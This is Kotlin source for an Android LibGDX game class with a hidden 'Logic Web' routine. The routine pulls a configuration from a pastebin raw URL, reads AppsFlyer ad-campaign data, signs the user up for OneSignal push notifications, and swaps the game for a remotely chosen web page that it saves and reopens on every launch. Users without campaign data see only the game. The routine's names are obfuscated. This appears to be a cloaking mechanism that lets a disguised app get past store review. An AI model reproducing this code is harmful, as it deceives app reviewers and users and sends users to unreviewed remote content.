package com.liberator.wisoliter.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.liberator.wisoliter.MainActivity
import com.liberator.wisoliter.appContext
import com.liberator.wisoliter.game.dataStore.DS_Balance
import com.liberator.wisoliter.game.dataStore.DS_CountryUron
import com.liberator.wisoliter.game.dataStore.DS_DataItem
import com.liberator.wisoliter.game.dataStore.DS_XP
import com.liberator.wisoliter.game.manager.MusicManager
import com.liberator.wisoliter.game.manager.NavigationManager
import com.liberator.wisoliter.game.manager.SoundManager
import com.liberator.wisoliter.game.manager.SpriteManager
import com.liberator.wisoliter.game.manager.util.MusicUtil
import com.liberator.wisoliter.game.manager.util.SoundUtil
import com.liberator.wisoliter.game.manager.util.SpriteUtil
import com.liberator.wisoliter.game.screens.LoaderScreen
import com.liberator.wisoliter.game.utils.GameColor
import com.liberator.wisoliter.game.utils.advanced.AdvancedGame
import com.liberator.wisoliter.game.utils.disposeAll
import com.liberator.wisoliter.util.log
import com.onesignal.OneSignal
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("liberator", MODE_PRIVATE)

    val listItemXP = listOf(50, 60, 80, 100, 120, 140, 150)

    val ds_Balance     = DS_Balance(coroutine)
    val ds_XP          = DS_XP(coroutine)
    val ds_DataItem    = DS_DataItem(coroutine)
    val ds_CountryUron = DS_CountryUron(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        simmagochi()
    }

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun simmagochi() {
        log("simmagochi")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        val simka = sharedPreferences.getString("simerik", "nosim") ?: "nosim"

        try {
            if (simka == "nosim") {
                coroutine.launch(Dispatchers.Main) {
                    val simJSON = withContext(Dispatchers.IO) { requestGet() }

                    if (simJSON != null) {
                        AppsFlyerLib.getInstance().init(simJSON.protokey, getAppsFlyerConversionListener(simJSON.libert, simJSON.osmos), appContext)
                        AppsFlyerLib.getInstance().start(activity, simJSON.protokey, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(simka)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<SimJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/g9ibnbpY"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = SimJSON(
                    libert   = jsonResponse.getString("libert")   ?: "",
                    protokey = jsonResponse.getString("protokey") ?: "",
                    osmos    = jsonResponse.getString("osmos")    ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class SimJSON(val libert: String, val protokey: String, val osmos: String)

    private fun getAppsFlyerConversionListener(liber: String, osmos: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$liber?vizcd=$campaign&advizf=$afAd&medivizvolit=$media"
                log("link = $link")

                // OneSignal
                if (campaign != null) {
                    coroutine.launch(Dispatchers.Main) {
                        OneSignal.initWithContext(activity, osmos)
                        OneSignal.login(campaign)
                        withContext(Dispatchers.IO) { OneSignal.Notifications.requestPermission(false) }
                    }
                }

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("simerik", link).apply() }

                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}